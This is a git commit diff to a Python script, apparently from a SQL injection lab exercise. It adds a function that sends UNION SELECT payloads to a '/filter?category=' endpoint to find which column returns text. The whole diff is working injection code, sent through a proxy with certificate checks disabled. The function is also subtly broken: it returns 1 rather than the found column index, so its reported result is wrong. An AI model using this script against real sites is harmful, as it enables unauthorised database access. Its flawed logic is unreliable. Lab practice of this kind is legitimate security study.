543aff54fa982ddc096e91910edb4485fc67974e
venomous_parrot <venom@localhost.localdomain>
2024-12-27 11:42:24 -0500

    lab_4 completed

--- lab_4/sqli_lab_4.py
+++ lab_4/sqli_lab_4.py
@@ -22,6 +22,19 @@ def exploit_sqli(url,payload):
             break
     return i
 
+def exploit_sqli_string(url , no_of_columns):
+    uri = "/filter?category=Gifts'"
+    for i in range(1,no_of_columns+1):
+        string = "'UIMQ9h'"
+        payload_list = ['null'] * no_of_columns
+        payload_list[i-1] = string
+        sql_payload = "' union select " + ','.join(payload_list) + "--"
+        r = requests.get(url + uri + sql_payload, verify= False, proxies =proxies)
+        res = r.text
+        if string.strip('\'') in res:
+            return 1
+    return False        
+
 if __name__ == "__main__":
     try:
         # print("IN payload DON'T give the 'NULL --'")
@@ -32,5 +45,13 @@ if __name__ == "__main__":
         print("Example %s www.example.com ' 1=1--'" % sys.argv[0])
         sys.exit(-1)
 
+    print("Calculating Number of Columns")
     no_of_columns =  exploit_sqli(url,payload)
     print("No of columns = %i"% no_of_columns)
+    print("Finding which column have string data type and the specidied text...")
+    string_column = exploit_sqli_string(url, no_of_columns)
+    if string_column:
+        print("The column contains text is " + str(string_column) + ".")
+    else:
+        print("we were not able to find a column that has a string data type")
+            
